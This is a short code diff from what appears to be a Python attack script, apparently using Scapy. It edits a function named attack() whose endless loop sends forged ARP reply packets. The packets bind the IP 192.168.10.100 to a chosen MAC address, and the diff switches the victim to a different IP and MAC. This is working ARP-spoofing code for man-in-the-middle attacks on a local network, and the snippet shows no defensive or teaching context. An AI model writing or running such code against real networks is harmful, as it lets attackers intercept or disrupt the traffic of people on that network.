@@ -51,10 +51,10 @@ def attack():
           while True:
                packet = ARP(
                     op=2,
-                    pdst = '192.168.10.106',
-                    hwdst = '54:35:30:e5:1a:cd',
                     psrc = '192.168.10.100',
-                    hwsrc = '80:22:e6:34:1a:bd'
+                    hwsrc = '80:22:e6:34:1a:bd',
+                    pdst = '192.168.10.113',
+                    hwdst = '70:c9:4e:d2:bc:89',
                )
                send(packet, verbose=False)
      else:
